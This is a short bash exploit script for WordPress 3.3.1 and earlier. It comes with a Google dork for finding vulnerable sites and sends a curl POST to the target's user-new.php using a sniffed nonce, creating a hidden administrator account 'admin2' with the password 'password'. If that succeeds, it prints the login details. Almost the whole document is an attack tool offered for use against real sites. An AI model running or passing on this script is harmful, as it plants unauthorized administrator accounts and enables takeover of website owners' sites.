#!/bin/bash
# WordPress <= 3.3.1 Vuln
# Google Dork: https://www.google.com/#q="intitle:WordPress"+"inurl:readme.html"+"intext:3.3.1"
# @autor: Henrique Bissoli Silva (emp.shad@gmail.com)
# Updates: https://github.com/Shadowz3n/WP3.3.1

RED=`tput setaf 1`
GREEN=`tput setaf 2`
NC=`tput sgr0`

set -i

tput clear
exiting(){
	tput clear
	rm -f /tmp/tempfile
	echo "${GREEN}Exiting..${NC}"
	exit 1
}
control_c(){
	exiting
}
trap control_c SIGINT # Ctrl+C
if [[ "$1" ]]; then
	echo -e "\t${GREEN}Adding new administrator..${NC}"
	ADDADMIN=`curl -s -o "/dev/null" -w "%{http_code}" "$1/wp-admin/user-new.php" -d "action=createuser&_wpnonce_create-user=<sniffed_value>&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fuser-new.php&user_login=admin2&email=admin2@admin.com&first_name=admin2@admin.com&last_name=&url=&pass1=password&pass2=password&role=administrator&createuser=Add+New+User+"`
	if [[ "$ADDADMIN" = '200' || "$ADDADMIN" = '200' ]]; then
		echo -e "${GREEN}\tLink:$1/wp-admin \n\tLogin: admin2 \n\tPass: password${NC}"
	else
		echo -e "\t${RED}[Fails to add administrator]${NC}"
	fi
else
	echo -e "Usage: ./wpvulns.sh site.com"
fi
